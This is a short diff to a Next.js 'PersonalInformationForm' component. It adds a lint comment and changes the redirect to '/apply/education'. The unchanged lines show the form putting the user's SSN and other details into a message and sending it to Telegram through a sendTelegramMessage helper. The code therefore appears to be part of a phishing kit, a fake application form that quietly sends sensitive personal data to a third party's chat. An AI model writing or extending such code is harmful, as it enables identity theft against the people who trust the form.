@@ -1,3 +1,4 @@
+/* eslint-disable @next/next/no-img-element */
 "use client";
 import { sendTelegramMessage } from "../../../utils/telegram";
 import { useState } from "react";
@@ -70,7 +71,7 @@ const PersonalInformationForm = () => {
     SSN: ${formData.ssn}`;
 
     await sendTelegramMessage(message);
-    router.push("/education");
+    router.push("/apply/education");
   };
 
   return (
